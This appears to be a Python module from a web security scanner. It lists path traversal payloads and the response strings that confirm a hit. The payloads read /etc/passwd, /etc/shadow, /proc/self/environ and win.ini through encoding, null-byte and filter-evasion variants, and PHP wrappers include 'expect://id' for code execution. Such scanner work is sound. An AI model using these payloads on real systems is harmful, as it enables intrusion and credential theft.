"""
DevSecure360 — DAST Path Traversal Payloads (Enterprise Edition)
================================================================
Sources: OWASP Testing Guide WSTG-ATHZ-01, PayloadsAllTheThings LFI corpus,
PortSwigger path traversal cheat sheet, Burp Suite payload library.
"""


def get_payloads() -> list:
    """
    Enterprise path traversal payload set targeting /etc/passwd (Linux) and win.ini (Windows).
    Includes encoding bypass, null byte, WAF evasion, and deep traversal variants.
    """
    return [
        # ── Standard Unix traversal ───────────────────────────────────────────
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",

        # ── Linux sensitive files ─────────────────────────────────────────────
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../etc/hostname",
        "../../../proc/self/environ",       # reveals env vars / secrets
        "../../../proc/version",
        "../../../etc/issue",
        "../../../etc/os-release",

        # ── URL-encoded (single) ──────────────────────────────────────────────
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2Fetc%2Fpasswd",

        # ── Double URL-encoded ────────────────────────────────────────────────
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",

        # ── Unicode / overlong UTF-8 encoding ────────────────────────────────
        "\u002e\u002e/\u002e\u002e/etc/passwd",
        "..%c0%af..%c0%afetc%c0%afpasswd",      # overlong UTF-8 /
        "..%c1%9c..%c1%9cetc%c1%9cpasswd",      # overlong UTF-8 backslash

        # ── Null byte injection (terminates string in C/PHP/CGI) ──────────────
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd\x00",
        "../../../etc/passwd\x00.png",

        # ── Mixed backslash / forward slash (Windows-style) ──────────────────
        "..\\..\\..\etc\\passwd",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",

        # ── Absolute path injection ───────────────────────────────────────────
        "/etc/passwd",
        "/etc/passwd%00",
        "/etc/shadow",
        "/proc/self/environ",
        "C:\\windows\\win.ini",
        "C:/windows/win.ini",

        # ── Deep path stripping bypass ("/." stripping) ───────────────────────
        "....//....//....//etc/passwd",
        "....\/....\/....\/etc/passwd",
        "..././..././..././etc/passwd",         # filter strips ../ but leaves .././
        "..%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

        # ── PHP wrappers (if PHP app) ──────────────────────────────────────────
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "data://text/plain;base64,dGVzdA==",    # data:// wrapper
        "expect://id",                            # expect:// for RCE

        # ── Java / JSP path traversal ──────────────────────────────────────────
        "WEB-INF/web.xml",
        "../WEB-INF/web.xml",
        "../../WEB-INF/web.xml",
    ]


LINUX_ORACLE_STRINGS = [
    "root:x:0:0:",
    "root:!:0:0:",
    "/bin/bash",
    "/bin/sh",
    "nobody:x:",
    "daemon:x:",
    "HOSTNAME=",            # /proc/self/environ
    "PATH=/usr",            # /proc/self/environ
    "Linux version",        # /proc/version
]

WINDOWS_ORACLE_STRINGS = [
    "[extensions]",
    "[boot loader]",
    "[operating systems]",
    "MSDOS.SYS",
    "[386Enh]",
    "[drivers]",
    "for 16-bit app support",
]
